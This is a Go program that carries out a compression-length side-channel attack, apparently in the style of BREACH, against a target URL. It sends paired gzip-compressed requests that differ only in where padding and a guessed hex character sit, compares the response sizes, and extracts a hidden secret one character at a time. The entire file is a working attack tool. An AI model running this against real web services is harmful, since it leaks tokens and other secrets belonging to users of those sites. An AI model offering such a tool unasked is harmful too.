package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"time"
	"net/http"
	"os"
)

const PAD_MIN = 1;
const PAD_MAX = 60;
const BADROUND_MAX = 3;

var currentPadding = 10;

var tr = &http.Transport{
    MaxIdleConns:       10,
    IdleConnTimeout:    30 * time.Second,
    DisableCompression: true,
}

var client = &http.Client{Transport: tr}

/**
 * Return the ContentLength of a request (NOTE: Requires hacked STL to set ContentLength on compressed messages)
 */
func Get(url string) (int, error) {

	request, err := http.NewRequest("GET", url, nil)
	request.Header.Add("Accept-Encoding", "gzip")

	response, err := client.Do(request)

	if err != nil {
		fmt.Printf("%s", err)
		log.Fatal(err)
	}

	b, err := ioutil.ReadAll(response.Body)

	if err != nil {
		log.Fatal(err)
	}

    response.Body.Close()

    return len(b), nil;
}

/**
 * Makes two requests x + PADDING and PADDING + x, guess is correct is Len(Req1) < Len(Req2)
 */
func MakeGuess(target string, guessedSoFar string, guess string) (bool, error) {
    padding := "";

    for i := 0; i < currentPadding / 2; i++ {
        padding += "{}";
    }

    bytes1, err := Get(target + guessedSoFar + guess + padding);

    if err != nil {
        return false, err;
    }

    bytes2, err := Get(target + guessedSoFar + padding + guess);

    if err != nil {
        return false, err;
    }

    return bytes1 < bytes2, nil;
}

/**
 * Set currentPadding to a random value between padMin and padMax
 */
func AdjustPadding() {
    currentPadding = rand.Intn(PAD_MAX - PAD_MIN) + PAD_MIN;
}

func main() {

	if len(os.Args) < 2 {
		fmt.Printf("BadArgs\n");
		return;
	}

    target := os.Args[1];

    KeySpace := []string{"A", "B", "C", "D", "E", "F", "0","1","2","3","4","5","6","7","8","9"};

    guessedSoFar := "";
    badRounds := 0;

    for {
        roundWinner := "";

        for _, key := range KeySpace {
            winner, err := MakeGuess(target, guessedSoFar, key);
            
            if err != nil {
                fmt.Printf("Error %s\n", err);
                return;
            }

            if winner {
                //TODO: Check there aren't two round winners
                roundWinner = key;
            }
        }

        if roundWinner == "" {
            AdjustPadding();
        }

        if roundWinner == "" {
            for _, k1 := range KeySpace {
                for _, k2 := range KeySpace {
                    winner, err := MakeGuess(target, guessedSoFar, k1 + k2);

                    if err != nil {
                        fmt.Printf("Error %s\n", err);
                        return;
                    }

                    if winner {
                        //TODO: Check there aren't two round winners
                        roundWinner = k1 + k2;
                    }
                }
            }
        }

        guessedSoFar += roundWinner;

        if roundWinner != "" {
            fmt.Printf("So Far: %s\n", guessedSoFar);
            badRounds = 0;
        } else {
            badRounds++;
        }

        fmt.Printf("Round Completed (%v bad rounds)\n", badRounds);

        if badRounds > BADROUND_MAX {
            break;
        }

    }

    fmt.Printf("Final Guess: %s\n", guessedSoFar);
}